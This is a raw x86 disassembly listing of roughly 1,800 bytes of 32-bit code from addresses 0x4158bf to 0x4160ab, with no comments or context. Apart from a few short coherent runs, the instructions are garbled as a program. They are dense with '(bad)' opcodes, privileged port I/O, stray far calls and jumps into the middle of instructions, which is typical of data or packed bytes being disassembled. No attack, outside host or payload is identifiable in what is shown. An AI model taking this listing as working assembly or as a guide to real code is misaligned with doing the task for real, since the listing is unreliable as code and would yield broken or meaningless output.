  4158bf:	cmp    BYTE PTR ds:0xb1036412,0x4c
  4158c6:	xor    BYTE PTR [eax-0x18339ea9],ch
  4158cc:	or     ah,bl
  4158ce:	mov    ?,WORD PTR [esi+eax*2-0xca07ad4]
  4158d5:	mov    fs:0x6edaf950,al
  4158db:	nop    DWORD PTR [edi-0x77]
  4158df:	leave  
  4158e0:	in     al,0xd8
  4158e2:	sub    eax,0x6f47817d
  4158e7:	stos   BYTE PTR es:[edi],al
  4158e8:	inc    edx
  4158e9:	add    BYTE PTR [ebx+0x591a86c1],bh
  4158ef:	gs jno 0x415947
  4158f2:	and    al,0x50
  4158f4:	leave  
  4158f5:	ss ins BYTE PTR es:[edi],dx
  4158f7:	shl    BYTE PTR [esi-0x53d8b510],1
  4158fd:	aam    0x23
  4158ff:	sbb    eax,0xf3019118
  415904:	pop    es
  415905:	cmp    eax,DWORD PTR [eax]
  415907:	aad    0x30
  415909:	aas    
  41590a:	mov    ah,0x61
  41590c:	jne    0x415978
  41590e:	adc    dl,BYTE PTR [ebp-0x19]
  415911:	mov    eax,0xe93334f
  415916:	out    dx,eax
  415917:	xchg   edi,eax
  415918:	push   eax
  415919:	or     al,0xa6
  41591b:	xchg   ecx,eax
  41591c:	add    al,0x76
  41591e:	push   esi
  41591f:	mov    ebp,0xb519bf5
  415924:	pop    eax
  415925:	ret    
  415926:	and    BYTE PTR [edi+ebx*1],al
  415929:	fimul  DWORD PTR [edi*4+0x76111cac]
  415930:	dec    edi
  415931:	mov    ch,0x39
  415933:	popa   
  415934:	adc    ebp,DWORD PTR [eax+0x13218103]
  41593a:	inc    edi
  41593b:	js     0x415930
  41593d:	mov    ds:0xe6084168,eax
  415942:	mov    WORD PTR [esi],ds
  415944:	mov    ch,ch
  415946:	addr16 out 0xb,al
  415949:	sbb    al,0x7e
  41594b:	jmp    0x88ab08ce
  415950:	gs jne 0x41594f
  415953:	push   esp
  415954:	push   cs
  415955:	bound  edi,QWORD PTR [edi]
  415957:	adc    edx,ebp
  415959:	add    edi,0x36
  41595c:	push   edx
  41595d:	rdmsr  
  41595f:	dec    esp
  415960:	retf   0x6fba
  415963:	jmp    0x415906
  415965:	push   0x33714243
  41596a:	shl    BYTE PTR [edi+0x917dc8a],0xdf
  415971:	mov    esi,DWORD PTR [ebp-0x3b]
  415974:	pop    eax
  415975:	aas    
  415976:	mov    edi,0x2eb49d9a
  41597b:	shl    DWORD PTR [edi-0x5],0x2
  41597f:	out    0x6f,al
  415981:	sbb    DWORD PTR [eax+0x7c472e58],eax
  415987:	cld    
  415988:	outs   dx,DWORD PTR ds:[esi]
  415989:	lea    eax,[edi-0x1e0b5380]
  41598f:	test   al,0x51
  415991:	in     al,dx
  415992:	lods   eax,DWORD PTR ds:[esi]
  415993:	xchg   ebp,eax
  415994:	or     eax,0xf8d81ac6
  415999:	aad    0x67
  41599b:	loopne 0x415980
  41599d:	leave  
  41599e:	add    DWORD PTR [esi],esi
  4159a0:	and    eax,0x3ac1d3b4
  4159a5:	push   eax
  4159a6:	pushf  
  4159a7:	stc    
  4159a8:	mov    ss,ecx
  4159aa:	xor    al,0x7d
  4159ac:	cmp    DWORD PTR [esi-0x64],eax
  4159af:	in     eax,dx
  4159b0:	jg     0x415956
  4159b2:	cmp    BYTE PTR [ebp-0x52],0xde
  4159b6:	xor    al,0xa
  4159b8:	jmp    0x4159a2
  4159ba:	push   0x38
  4159bc:	nop
  4159bd:	pushf  
  4159be:	push   ds
  4159bf:	mov    BYTE PTR [ebx-0x26],dh
  4159c2:	nop
  4159c3:	jne    0x415a26
  4159c5:	leave  
  4159c6:	lahf   
  4159c7:	popf   
  4159c8:	test   DWORD PTR [edx],esi
  4159ca:	sub    dl,al
  4159cc:	in     al,dx
  4159cd:	adc    bl,dl
  4159cf:	sbb    edi,DWORD PTR [edi-0x15]
  4159d2:	pop    ecx
  4159d3:	and    eax,0xacbeebe5
  4159d8:	mov    esi,0x2d2427ce
  4159dd:	sbb    al,0x8b
  4159df:	jecxz  0x41597c
  4159e1:	push   eax
  4159e2:	adc    BYTE PTR gs:[eax-0x6610b43e],0xff
  4159ea:	mov    ch,BYTE PTR [edx+0x4b]
  4159ed:	push   esp
  4159ee:	test   DWORD PTR [edi+edx*8],0xb2b1c29e
  4159f5:	shl    dl,1
  4159f7:	cdq    
  4159f8:	adc    DWORD PTR [eax],ebx
  4159fa:	les    ebx,FWORD PTR [edx-0x3b7ded3a]
  415a00:	das    
  415a01:	shl    DWORD PTR [edx-0x7a8cf89a],cl
  415a07:	stos   DWORD PTR es:[edi],eax
  415a08:	bound  esi,QWORD PTR [ebx+0x76]
  415a0b:	xchg   ecx,eax
  415a0c:	mov    ds:0xff94596b,al
  415a11:	(bad)  
  415a12:	call   0x2881:0x64d8809f
  415a19:	test   eax,0x5cef88fe
  415a1e:	dec    edi
  415a1f:	xchg   ebp,eax
  415a20:	in     eax,0x3e
  415a22:	mul    edx
  415a24:	das    
  415a25:	push   0x871655bd
  415a2a:	adc    eax,0x1883095a
  415a2f:	xchg   edx,eax
  415a30:	fsubp  st(2),st
  415a32:	lods   eax,DWORD PTR ds:[esi]
  415a33:	out    dx,al
  415a34:	dec    esi
  415a35:	popf   
  415a36:	adc    edi,DWORD PTR [esi+esi*4-0x74ae45c4]
  415a3d:	and    eax,0x5491dc78
  415a42:	fstp   TBYTE PTR [edx]
  415a44:	cmp    eax,0x8323bba0
  415a49:	pop    ebx
  415a4a:	inc    ebp
  415a4b:	ret    
  415a4c:	sar    DWORD PTR [ebp-0x2c],cl
  415a4f:	or     ah,BYTE PTR [esi]
  415a51:	xor    ah,BYTE PTR [edx-0x71a1eb77]
  415a57:	pop    ebp
  415a58:	jl     0x415a54
  415a5a:	pop    edi
  415a5b:	dec    edx
  415a5c:	inc    edi
  415a5d:	mov    WORD PTR [edi+0x53],gs
  415a60:	sbb    bh,al
  415a62:	test   eax,0xc32e0a96
  415a67:	je     0x415a23
  415a69:	addr16 out 0x40,al
  415a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a6d:	pop    ebp
  415a6e:	scas   eax,DWORD PTR es:[edi]
  415a6f:	mov    BYTE PTR [esi],ah
  415a71:	jg     0x415ae7
  415a73:	fdiv   DWORD PTR [ebx-0x6b5461dc]
  415a79:	inc    edi
  415a7a:	scas   al,BYTE PTR es:[edi]
  415a7b:	fwait
  415a7c:	cmp    DWORD PTR [eax],edx
  415a7e:	inc    edi
  415a7f:	pop    ebx
  415a80:	loopne 0x415aa5
  415a82:	push   esp
  415a83:	pop    edi
  415a84:	sbb    eax,0x407ef569
  415a89:	mov    ah,0x33
  415a8b:	ror    DWORD PTR [ebp+0x729c0284],1
  415a91:	xor    al,BYTE PTR [eax]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	xor    bh,cl
  415aa6:	cmp    BYTE PTR [edx+0x707f0db8],dh
  415aac:	mov    ecx,0xcf70707e
  415ab1:	pop    edi
  415ab2:	icebp  
  415ab3:	sbb    edi,DWORD PTR [edi+0x7c1f75d4]
  415ab9:	mov    esi,0x115eb468
  415abe:	jg     0x415a9f
  415ac0:	jge    0x415a44
  415ac2:	mov    BYTE PTR [edi],cl
  415ac4:	ror    BYTE PTR [eax],1
  415ac6:	mov    edi,0xbb63bbd4
  415acb:	les    ebp,FWORD PTR [esi]
  415acd:	mov    dh,0x30
  415acf:	ret    
  415ad0:	ret    
  415ad1:	fcom   st(7)
  415ad3:	daa    
  415ad4:	or     al,0x35
  415ad6:	sti    
  415ad7:	sar    BYTE PTR [edx+0x73],cl
  415ada:	ret    0x19e3
  415add:	mov    dh,0x2a
  415adf:	into   
  415ae0:	cmp    eax,0x855cec47
  415ae5:	fwait
  415ae6:	mov    ss,WORD PTR [edi+0x63886c65]
  415aec:	or     eax,0x7a07f9e2
  415af1:	push   ss
  415af2:	je     0x415ab9
  415af4:	lea    eax,[eax+0x2b]
  415af7:	add    ebx,esp
  415af9:	mov    edi,0x75cc9285
  415afe:	mov    esi,cs
  415b00:	or     eax,0xc72be0be
  415b05:	out    0xc6,eax
  415b07:	jnp    0x415b43
  415b09:	repz inc edx
  415b0b:	push   ss
  415b0c:	sub    eax,0xe23a2ea7
  415b11:	js     0x415b30
  415b13:	or     ch,BYTE PTR [ebx]
  415b15:	data16 (bad) 
  415b18:	shl    BYTE PTR [ebp+0x23],1
  415b1b:	push   esp
  415b1c:	cmc    
  415b1d:	cmp    DWORD PTR [ebp+0x106c3c1c],ebx
  415b23:	mov    esi,DWORD PTR [ebp+0x5e4b8300]
  415b29:	push   0xffffffa3
  415b2b:	mov    esi,0x2c20a538
  415b30:	mov    ch,ch
  415b32:	mov    edx,0x832c6b87
  415b37:	mov    ds:0x5aca0031,eax
  415b3c:	or     al,0xb9
  415b3e:	jb     0x415ae3
  415b40:	loop   0x415af2
  415b42:	(bad)  [eax]
  415b44:	jo     0x415b5e
  415b46:	inc    ecx
  415b47:	mov    edx,0x67b0497a
  415b4c:	inc    ebp
  415b4d:	pop    ebx
  415b4e:	pop    ecx
  415b4f:	das    
  415b50:	loope  0x415b92
  415b52:	jae    0x415b99
  415b54:	stos   DWORD PTR es:[edi],eax
  415b55:	rol    DWORD PTR [edi-0xca800f6],1
  415b5b:	dec    edi
  415b5c:	addr16 popf 
  415b5e:	fmul   DWORD PTR [ecx-0x452c29ff]
  415b64:	cmp    eax,0xa7fc8314
  415b69:	leave  
  415b6a:	out    dx,al
  415b6b:	mov    ds:0xbae39adf,eax
  415b70:	push   cs
  415b71:	sbb    eax,0x874ef021
  415b76:	fs call 0xa4a3:0xd45aedd5
  415b7e:	hlt    
  415b7f:	test   DWORD PTR [ecx-0x4f],esp
  415b82:	ror    DWORD PTR [ecx+0x4],1
  415b85:	sub    edx,DWORD PTR [ebx]
  415b87:	aaa    
  415b88:	lock repnz fild DWORD PTR [edx]
  415b8c:	or     ah,BYTE PTR [ebx]
  415b8e:	xchg   esp,eax
  415b8f:	pushf  
  415b90:	mov    al,0x73
  415b92:	or     cl,BYTE PTR ds:0x8377e65c
  415b98:	cld    
  415b99:	sar    cl,cl
  415b9b:	or     al,0x82
  415b9d:	pop    eax
  415b9e:	out    0x37,eax
  415ba0:	call   0xb812:0x6be230e
  415ba7:	cmp    eax,0xfec1d33a
  415bac:	mov    BYTE PTR [esi],cl
  415bae:	loop   0x415beb
  415bb0:	sbb    bh,dl
  415bb2:	xchg   edi,eax
  415bb3:	out    0xe9,eax
  415bb5:	sti    
  415bb6:	mov    BYTE PTR [eax+ebx*2-0x1c],bl
  415bba:	pop    ss
  415bbb:	shl    BYTE PTR [ebp+0x47],1
  415bbe:	mov    esi,0x328572da
  415bc3:	jnp    0x415c27
  415bc5:	add    bl,BYTE PTR [ebx+esi*2]
  415bc8:	gs hlt 
  415bca:	test   eax,0x574154e8
  415bcf:	and    al,0x35
  415bd1:	test   eax,esp
  415bd3:	mov    dh,0xac
  415bd5:	xchg   edx,eax
  415bd6:	push   esi
  415bd7:	mov    esi,0x80ad2a2e
  415bdc:	pop    edi
  415bdd:	mov    edx,0x1c25db39
  415be2:	aas    
  415be3:	mov    ebx,0xd9023187
  415be8:	jno    0x415c16
  415bea:	add    al,dl
  415bec:	push   esi
  415bed:	fcom   QWORD PTR [edi-0x499d94f9]
  415bf3:	mov    cl,0x6e
  415bf5:	iret   
  415bf6:	js     0x415bd6
  415bf8:	test   al,0xb2
  415bfa:	mov    ecx,0xf8ca97bc
  415bff:	sub    al,0x46
  415c01:	jmp    0xe1f0d870
  415c06:	jge    0x415bf7
  415c08:	pushf  
  415c09:	push   edx
  415c0a:	mul    DWORD PTR ds:0x4a79482f
  415c10:	jecxz  0x415c33
  415c12:	sar    BYTE PTR [eax+0x23c42d8c],0x84
  415c19:	rol    BYTE PTR [edx],cl
  415c1b:	fld    QWORD PTR [ebx-0x4486ee7e]
  415c21:	int    0x88
  415c23:	stos   DWORD PTR es:[edi],eax
  415c24:	aas    
  415c25:	pop    ecx
  415c26:	les    eax,FWORD PTR [ecx-0x7d0e7b1e]
  415c2c:	call   FWORD PTR [edx-0x4fb1b9b5]
  415c32:	mov    ecx,0xd4886f4e
  415c37:	cs jno 0x415c5e
  415c3a:	mov    edx,DWORD PTR es:0x141f03f2
  415c41:	shr    BYTE PTR [esi-0x65],cl
  415c44:	sub    edi,ebp
  415c46:	jae    0x415c2b
  415c48:	add    BYTE PTR [edx],bh
  415c4a:	fidivr WORD PTR [esi+0x2c687abc]
  415c50:	out    dx,eax
  415c51:	inc    esp
  415c52:	push   esp
  415c53:	pop    ss
  415c54:	enter  0x7bf3,0x4f
  415c58:	les    esi,FWORD PTR [ebx-0x2e47fee]
  415c5e:	push   ss
  415c5f:	fs dec esp
  415c61:	call   0x2fdb:0xd44427ce
  415c68:	push   es
  415c69:	ret    0x4801
  415c6c:	into   
  415c6d:	xor    BYTE PTR [edi-0x1ad9c632],0x6b
  415c74:	cwde   
  415c75:	add    DWORD PTR [edx],ebx
  415c77:	sbb    DWORD PTR [ebx-0x5fd4e781],edi
  415c7d:	push   0x3bc8d454
  415c82:	int    0x82
  415c84:	inc    esi
  415c85:	iret   
  415c86:	sub    ch,BYTE PTR [ecx+0x376fb099]
  415c8c:	fnsave [edx]
  415c8e:	adc    eax,0x7da24d60
  415c93:	xchg   ebx,eax
  415c94:	pop    ebp
  415c95:	inc    eax
  415c96:	mov    cl,0x80
  415c98:	cmp    ah,BYTE PTR [esi+0x3a]
  415c9b:	data16 and al,BYTE PTR [edi+0x3]
  415c9f:	push   cs
  415ca0:	iret   
  415ca1:	fsub   DWORD PTR [edx-0xf986da7]
  415ca7:	xchg   esi,eax
  415ca8:	xchg   esi,eax
  415ca9:	xor    ecx,0x75
  415cac:	mov    al,0x29
  415cae:	mov    ds:0x845cf16e,al
  415cb3:	sar    ah,0xdf
  415cb6:	jnp    0x415d28
  415cb8:	xchg   ebp,eax
  415cb9:	repnz push eax
  415cbb:	inc    ebx
  415cbc:	add    DWORD PTR [ebp-0x66],edx
  415cbf:	adc    ebx,DWORD PTR [edx-0x74]
  415cc2:	xlat   BYTE PTR ds:[ebx]
  415cc3:	jne    0x415cfd
  415cc5:	inc    edx
  415cc6:	fucom  st(0)
  415cc8:	not    esi
  415cca:	dec    esp
  415ccb:	mov    ebp,DWORD PTR [esi+0x1d02065c]
  415cd1:	add    eax,0xf0e8b687
  415cd6:	retf   
  415cd7:	(bad)  
  415cd8:	int    0x8e
  415cda:	sbb    DWORD PTR [edx-0x57],ecx
  415cdd:	nop
  415cde:	mov    eax,0xb1d627af
  415ce3:	inc    eax
  415ce4:	outs   dx,DWORD PTR ds:[esi]
  415ce5:	cmp    BYTE PTR [eax-0x14],cl
  415ce8:	jb     0x415cdd
  415cea:	mov    WORD PTR [ebx+0x3f],gs
  415ced:	sub    al,BYTE PTR [ecx+0x669318ce]
  415cf3:	loope  0x415c7b
  415cf5:	mov    edi,0x2abff163
  415cfa:	xchg   esp,eax
  415cfb:	inc    eax
  415cfc:	xor    ebp,DWORD PTR [edx+eiz*4]
  415cff:	dec    ebx
  415d00:	mul    BYTE PTR [ecx]
  415d02:	and    dl,bh
  415d04:	mov    eax,0xd154f942
  415d09:	mov    eax,ds:0x78a741a9
  415d0e:	jl     0x415d8d
  415d10:	mov    DWORD PTR [ebx-0x31f80e43],edi
  415d16:	rol    bh,1
  415d18:	fisttp DWORD PTR [edx+eiz*2-0x34]
  415d1c:	push   edx
  415d1d:	ficomp WORD PTR [eax+0x1b]
  415d20:	cmp    DWORD PTR [ecx+0x4f9cee75],0xff4ae379
  415d2a:	ins    DWORD PTR es:[edi],dx
  415d2b:	xor    al,0x98
  415d2d:	push   eax
  415d2e:	enter  0x6be,0x38
  415d32:	or     dl,dl
  415d34:	pop    bx
  415d36:	jp     0x415d26
  415d38:	mov    edx,0x67c804b6
  415d3d:	jmp    0x5f7f:0x174d1428
  415d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d45:	fidiv  DWORD PTR [ecx-0x54]
  415d48:	jno    0x415d4d
  415d4a:	(bad)  
  415d4b:	adc    al,0x27
  415d4d:	xor    ebx,DWORD PTR [ebx]
  415d4f:	ins    DWORD PTR es:[edi],dx
  415d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d51:	pop    ebx
  415d52:	or     BYTE PTR [edx-0x6b7cc7b0],ah
  415d58:	mov    esp,0xe18bf882
  415d5d:	aad    0xd6
  415d5f:	stos   BYTE PTR es:[edi],al
  415d60:	ds dec edi
  415d62:	fwait
  415d63:	clc    
  415d64:	sbb    eax,0xb0a6594c
  415d69:	add    ebx,DWORD PTR [ebp+0x5d]
  415d6c:	push   ebx
  415d6d:	out    dx,eax
  415d6e:	fwait
  415d6f:	xchg   esp,eax
  415d70:	sbb    DWORD PTR [esi+ebp*8+0x71d2511a],edx
  415d77:	mov    edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	mov    esi,DWORD PTR [ebx]
  415d96:	in     eax,0x3a
  415d98:	or     DWORD PTR [edx],0x7eb9707f
  415d9e:	jo     0x415e10
  415da0:	cli    
  415da1:	in     eax,dx
  415da2:	push   edi
  415da3:	shl    BYTE PTR [edi],1
  415da5:	inc    BYTE PTR [esi+eax*2-0x73038fe9]
  415dac:	adc    DWORD PTR [eax-0x44],esi
  415daf:	xor    eax,0x16
  415db2:	nop
  415db3:	xchg   DWORD PTR [ebx],esp
  415db5:	in     eax,0x62
  415db7:	push   eax
  415db8:	push   ebp
  415db9:	mov    WORD PTR [edx-0x33423477],cs
  415dbf:	or     al,0xe6
  415dc1:	dec    eax
  415dc2:	icebp  
  415dc3:	test   eax,0xf2c48195
  415dc8:	call   0x8fe20e0f
  415dcd:	jmp    0x5b2:0x363eebb3
  415dd4:	enter  0x4e32,0x8f
  415dd8:	inc    edx
  415dd9:	pop    eax
  415dda:	adc    ebp,DWORD PTR [esi+0x4a3db9dd]
  415de0:	push   esi
  415de1:	sub    eax,0x29107247
  415de6:	push   edi
  415de7:	sbb    edx,DWORD PTR [ebx-0x37]
  415dea:	hlt    
  415deb:	xchg   ebx,eax
  415dec:	or     esi,DWORD PTR [edx-0x14]
  415def:	push   es
  415df0:	out    dx,eax
  415df1:	jmp    0xff890fff
  415df6:	jno    0x415d7d
  415df8:	inc    ebx
  415df9:	mov    dh,0xe9
  415dfb:	rcr    cl,0xe6
  415dfe:	and    ebp,ecx
  415e00:	add    edx,ecx
  415e02:	push   ds
  415e03:	mov    dl,0x5c
  415e05:	or     eax,0x5c92d3b7
  415e0a:	xchg   edx,eax
  415e0b:	xchg   ebx,esi
  415e0d:	inc    esi
  415e0e:	loope  0x415e06
  415e10:	cmp    al,0xf7
  415e12:	icebp  
  415e13:	pop    ebx
  415e14:	inc    esp
  415e15:	out    0xf5,ax
  415e18:	push   ecx
  415e19:	popf   
  415e1a:	cs inc ecx
  415e1c:	outs   dx,DWORD PTR ds:[esi]
  415e1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e1e:	inc    edx
  415e1f:	sub    al,0xc5
  415e21:	cld    
  415e22:	in     eax,0x55
  415e24:	sub    al,0xf
  415e26:	or     BYTE PTR [ebx],cl
  415e28:	js     0x415e05
  415e2a:	mov    bl,0x84
  415e2c:	pop    eax
  415e2d:	dec    esi
  415e2e:	mov    BYTE PTR [edx],dh
  415e30:	hlt    
  415e31:	dec    edi
  415e32:	mov    ebp,0xa2f4304b
  415e37:	cmp    BYTE PTR [eax-0x2c],bh
  415e3a:	cmp    DWORD PTR [ebp+0x2c],eax
  415e3d:	shl    BYTE PTR [ebx*8+0x4e6be3c3],1
  415e44:	pop    es
  415e45:	or     BYTE PTR [edx-0x23],dh
  415e48:	inc    esp
  415e49:	xchg   edi,esp
  415e4b:	in     al,0xac
  415e4d:	jns    0x415e2b
  415e4f:	lods   al,BYTE PTR ds:[esi]
  415e50:	inc    ebx
  415e51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e52:	sub    bh,BYTE PTR [ebp-0x6]
  415e55:	push   esi
  415e56:	out    0xbd,eax
  415e58:	add    ecx,eax
  415e5a:	jmp    0x7842291
  415e5f:	jne    0x415e9d
  415e61:	sbb    BYTE PTR [eax-0x460cf9c],dl
  415e67:	jb     0x415e4d
  415e69:	pop    ecx
  415e6a:	sbb    al,0xae
  415e6c:	add    DWORD PTR [edi-0x5162cff6],ecx
  415e72:	mov    edi,0x6fb230e0
  415e77:	outs   dx,DWORD PTR ds:[esi]
  415e78:	imul   eax,eax,0xfffffffc
  415e7b:	fistp  WORD PTR [esi]
  415e7d:	mov    ebx,esi
  415e7f:	(bad)  
  415e80:	sar    al,0x11
  415e83:	inc    edi
  415e84:	mov    bh,BYTE PTR [ecx]
  415e86:	sar    ecx,cl
  415e88:	(bad)  
  415e89:	jge    0x415e8a
  415e8b:	add    eax,0x26c9d3fe
  415e90:	ins    DWORD PTR es:[edi],dx
  415e91:	cdq    
  415e92:	xor    DWORD PTR [ebx],ebx
  415e94:	dec    ecx
  415e95:	inc    BYTE PTR [esp+eax*1]
  415e98:	out    dx,eax
  415e99:	popa   
  415e9a:	arpl   WORD PTR [edi-0x6a3cdd3b],ax
  415ea0:	bound  esp,QWORD PTR [esp+edi*2-0x1b]
  415ea4:	arpl   WORD PTR [ecx-0x1ada98a4],sp
  415eaa:	pop    esp
  415eab:	int3   
  415eac:	in     al,dx
  415ead:	fdiv   QWORD PTR [edx+0x14]
  415eb0:	clc    
  415eb1:	sub    ecx,DWORD PTR [ebx+0x5eb3f1e7]
  415eb7:	xchg   esp,eax
  415eb8:	xor    DWORD PTR [edx],ebx
  415eba:	fistp  DWORD PTR [esi+0x21e3e631]
  415ec0:	stc    
  415ec1:	jecxz  0x415f2c
  415ec3:	mov    ebp,DWORD PTR [eax]
  415ec5:	cmp    BYTE PTR [eax-0x29a77740],bl
  415ecb:	add    al,0x4
  415ecd:	sub    DWORD PTR [ebp+0x3e],edx
  415ed0:	out    0x21,al
  415ed2:	jb     0x415f05
  415ed4:	pop    edx
  415ed5:	inc    esp
  415ed6:	clc    
  415ed7:	ja     0x415eb0
  415ed9:	std    
  415eda:	xchg   esi,eax
  415edb:	ins    DWORD PTR es:[edi],dx
  415edc:	xlat   BYTE PTR ds:[ebx]
  415edd:	pop    es
  415ede:	xchg   esi,eax
  415edf:	cdq    
  415ee0:	mov    ss,WORD PTR [edx]
  415ee2:	loopne 0x415f5c
  415ee4:	lods   eax,DWORD PTR ds:[esi]
  415ee5:	mov    al,0x59
  415ee7:	inc    esi
  415ee8:	push   0xfffffff6
  415eea:	add    DWORD PTR [ecx-0x5d41652f],edi
  415ef0:	test   edi,eax
  415ef2:	xchg   ebp,eax
  415ef3:	jns    0x415efd
  415ef5:	dec    ebp
  415ef6:	imul   ebp,DWORD PTR [edx],0x4c
  415ef9:	jp     0x415f20
  415efb:	pusha  
  415efc:	xchg   ebx,eax
  415efd:	pop    ebp
  415efe:	les    esp,FWORD PTR ds:0xea7ea667
  415f04:	mov    ds:0xa254a268,eax
  415f09:	and    dh,BYTE PTR ss:[esi+ebp*2-0x7a]
  415f0e:	loopne 0x415f08
  415f10:	sbb    DWORD PTR [ecx],ecx
  415f12:	dec    ebp
  415f13:	mov    ds:0xe627b185,eax
  415f18:	xor    DWORD PTR [esi+ebx*2],edx
  415f1b:	and    bh,BYTE PTR [edi-0xa]
  415f1e:	push   esi
  415f1f:	es and eax,0xedb19bd0
  415f25:	xchg   edi,eax
  415f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f27:	xchg   esi,eax
  415f28:	cmp    bh,BYTE PTR [ebx+0x7a]
  415f2b:	inc    ecx
  415f2c:	or     DWORD PTR [esp+ebp*8+0x4b],0x2246f7da
  415f34:	pop    ebx
  415f35:	(bad)  
  415f36:	sub    BYTE PTR ds:[ecx-0x52328b40],ah
  415f3d:	sahf   
  415f3e:	and    eax,DWORD PTR ds:0x6e98ff8f
  415f44:	cmp    DWORD PTR [eax-0x79],esi
  415f47:	add    al,0x3d
  415f49:	lock mov ebx,0xf4890b11
  415f4f:	lock imul ecx,DWORD PTR [eax],0xb0f58fac
  415f56:	dec    ebp
  415f57:	cs lahf 
  415f59:	cld    
  415f5a:	mov    edx,0x14362297
  415f5f:	pusha  
  415f60:	mov    esp,0xf7c6e48d
  415f65:	add    BYTE PTR [ebx-0x9],cl
  415f68:	dec    DWORD PTR [edx-0x56dd52d4]
  415f6e:	mov    bl,BYTE PTR [eax-0x25]
  415f71:	cmp    al,0x9e
  415f73:	enter  0x170a,0x7e
  415f77:	iret   
  415f78:	mov    eax,ds:0xa0666785
  415f7d:	scas   eax,DWORD PTR es:[edi]
  415f7e:	adc    ebx,DWORD PTR [ecx]
  415f80:	push   edi
  415f81:	jmp    0x1cf6:0xb69cf520
  415f88:	pusha  
  415f89:	into   
  415f8a:	out    0xc,eax
  415f8c:	cmp    DWORD PTR [esi+0x5670ee2],edi
  415f92:	cmp    edx,DWORD PTR [edx]
  415f94:	sbb    eax,0xe9effa04
  415f99:	pushf  
  415f9a:	(bad)  
  415f9b:	mov    ebx,0x457e90d9
  415fa0:	and    DWORD PTR [ebx-0x7219f8ff],edi
  415fa6:	inc    ebp
  415fa7:	add    DWORD PTR [eax],0xbb77bd5b
  415fad:	or     eax,0xccc31e77
  415fb2:	pop    es
  415fb3:	or     eax,0x26022f7e
  415fb8:	icebp  
  415fb9:	mov    ds:0x359446f9,al
  415fbe:	lock mov dh,0x1b
  415fc1:	(bad)  
  415fc2:	das    
  415fc3:	cs mov edx,0xae08a24
  415fc9:	jae    0x41603e
  415fcb:	mov    bl,0xec
  415fcd:	mov    cl,0x50
  415fcf:	add    edi,ecx
  415fd1:	cli    
  415fd2:	push   edx
  415fd3:	arpl   WORD PTR [eax-0x32],ax
  415fd6:	fcmovbe st,st(7)
  415fd8:	loope  0x41602c
  415fda:	fidivr WORD PTR [ebx]
  415fdc:	jmp    0x287d4037
  415fe1:	sub    ebp,edi
  415fe3:	cwde   
  415fe4:	rol    BYTE PTR [edx],cl
  415fe6:	jmp    0x97ad90cd
  415feb:	(bad)  
  415fec:	clc    
  415fed:	lahf   
  415fee:	sahf   
  415fef:	loop   0x415fb7
  415ff1:	mov    dh,0x72
  415ff3:	jl     0x416032
  415ff5:	jmp    ebx
  415ff7:	and    ebp,DWORD PTR [edx]
  415ff9:	retf   
  415ffa:	push   0x5d
  415ffc:	xor    al,0xbb
  415ffe:	or     ah,ch
  416000:	jae    0x415f96
  416002:	push   es
  416003:	sar    ch,1
  416005:	shr    DWORD PTR [edx],cl
  416007:	jecxz  0x415fa6
  416009:	sub    BYTE PTR [edx],0xb8
  41600c:	adc    dl,BYTE PTR [esi+0x36af90a1]
  416012:	cld    
  416013:	push   edx
  416014:	mov    es,WORD PTR [esi+0x4c]
  416017:	jle    0x416021
  416019:	dec    esp
  41601a:	hlt    
  41601b:	mov    gs,WORD PTR [ebx+0x9]
  41601e:	fsubr  st(7),st
  416020:	rcl    DWORD PTR [eax],1
  416022:	pop    es
  416023:	dec    edx
  416024:	fidiv  WORD PTR ss:0xa27b189e
  41602b:	xchg   ebx,eax
  41602c:	push   ebp
  41602d:	cmp    eax,esi
  41602f:	stos   BYTE PTR es:[edi],al
  416030:	add    esi,esi
  416032:	stc    
  416033:	push   esp
  416034:	inc    ecx
  416035:	and    ah,BYTE PTR [eax-0x1f672ca5]
  41603b:	out    0xea,eax
  41603d:	jb     0x4160b5
  41603f:	icebp  
  416040:	cs in  al,dx
  416042:	mov    ds,WORD PTR [edi+edi*8]
  416045:	mov    al,ds:0xabd91348
  41604a:	dec    esi
  41604b:	int3   
  41604c:	or     al,0x1f
  41604e:	jo     0x41608e
  416050:	adc    dl,bl
  416052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416053:	sar    ebx,cl
  416055:	dec    esp
  416056:	jb     0x4160bf
  416058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416059:	xor    bh,BYTE PTR [esi+0x5a]
  41605c:	fdivr  QWORD PTR [ebx+0x6f28fc7e]
  416062:	xchg   esp,eax
  416063:	dec    esp
  416064:	and    eax,0x558b011a
  416069:	or     BYTE PTR [ebx],dh
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x416023
  41609a:	sbb    dh,BYTE PTR [ebp+0x7f17ca67]
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x4160a7
  4160a6:	mov    cl,0x43
  4160a8:	sbb    ebp,edi
  4160aa:	stos   DWORD PTR es:[edi],eax
  4160ab:	hlt    
